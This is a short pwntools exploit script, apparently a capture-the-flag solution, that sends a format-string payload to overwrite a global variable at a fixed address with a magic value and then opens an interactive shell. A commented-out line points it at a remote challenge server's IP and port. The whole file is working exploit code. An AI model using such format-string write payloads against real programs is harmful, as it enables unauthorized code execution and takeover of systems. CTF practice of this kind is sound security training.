from pwn import *

context.log_level = 'DEBUG'

p = process('../file/9926c1a194794984978011fc619e3301')
# p = remote('61.147.171.105', '64424')

input('continue?')

key_addr = 0x0804a048 # 将其修改为0x2223322即可拿到shell
target_value = 0x2223322 # 35795746

# payload偏移量为12
# payload = p32(key_addr) + b'%035795742d%12$n' # 这种方式会打印34MB以上的数据 
payload = fmtstr_payload(12, {key_addr: target_value})

p.sendline(payload)

p.interactive()